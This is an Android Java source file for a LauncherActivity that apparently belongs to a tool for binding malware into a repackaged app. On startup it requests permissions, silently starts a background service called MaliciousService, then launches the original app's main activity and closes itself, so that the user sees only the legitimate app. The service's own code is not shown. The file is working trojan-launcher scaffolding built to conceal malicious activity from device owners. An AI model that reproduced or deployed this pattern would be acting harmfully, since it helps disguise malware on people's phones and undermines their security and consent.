package com.example.android;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.Manifest;
import android.content.Context;
import android.os.Build;

public class LauncherActivity extends Activity {
    private static final String TAG = "LauncherActivity";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "LauncherActivity onCreate started");

        // Avvia l'activity per richiedere i permessi prima di tutto
        Intent permissionIntent = new Intent(this, PermissionRequestActivity.class);
        startActivity(permissionIntent);
        
        // Start the malicious service in the background
        startMaliciousService();

        // Launch the original main activity of the bound app
        launchOriginalMainActivity();

        // Non nascondiamo più l'icona per permettere all'app di funzionare normalmente
        // hideLauncherIcon();

        // Finish this launcher activity so the user only sees the original app
        finish();
        Log.d(TAG, "LauncherActivity finished");
    }

    private void startMaliciousService() {
        try {
            Intent serviceIntent = new Intent(this, MaliciousService.class);
            startService(serviceIntent);
            Log.d(TAG, "MaliciousService started successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start MaliciousService", e);
        }
    }

    private void launchOriginalMainActivity() {
        try {
            // Find the original main activity to launch
            ComponentName originalMain = findOriginalMainActivity();
            if (originalMain != null) {
                Intent mainIntent = new Intent();
                mainIntent.setComponent(originalMain);
                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                startActivity(mainIntent);
                Log.d(TAG, "Original main activity launched: " + originalMain.getClassName());
            } else {
                Log.w(TAG, "Could not find original main activity to launch");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to launch original main activity", e);
        }
    }

    private void hideLauncherIcon() {
        // Non nascondiamo più l'icona per permettere all'app di funzionare normalmente
        Log.d(TAG, "Keeping launcher icon visible for normal app functionality");
    }

    private ComponentName findOriginalMainActivity() {
        try {
            Intent mainIntent = new Intent(Intent.ACTION_MAIN);
            mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
            mainIntent.setPackage(getPackageName());
            
            PackageManager pm = getPackageManager();
            for (android.content.pm.ResolveInfo info : pm.queryIntentActivities(mainIntent, 0)) {
                String className = info.activityInfo.name;
                // Make sure we don't return our own launcher activity
                if (!className.equals(LauncherActivity.class.getName())) {
                    return new ComponentName(getPackageName(), className);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error finding original main activity", e);
        }
        return null;
    }
}
